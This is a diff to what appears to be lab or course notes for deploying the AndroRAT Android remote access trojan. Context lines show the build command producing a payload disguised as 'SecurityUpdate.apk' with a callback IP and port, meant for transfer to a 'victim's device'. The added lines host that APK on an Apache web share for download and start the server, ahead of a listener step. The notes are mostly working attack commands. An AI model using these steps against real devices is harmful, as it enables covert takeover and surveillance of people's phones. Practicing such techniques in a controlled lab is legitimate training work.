@@ -69,6 +69,16 @@ python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
 
 → this is our RAT that we need to transfer to the victim's device
 
+```bash
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share
+```
+-> Need to start the local server
+```bash
+  service apache2 start
+```
 
 → now we start a listener 
 ```bash
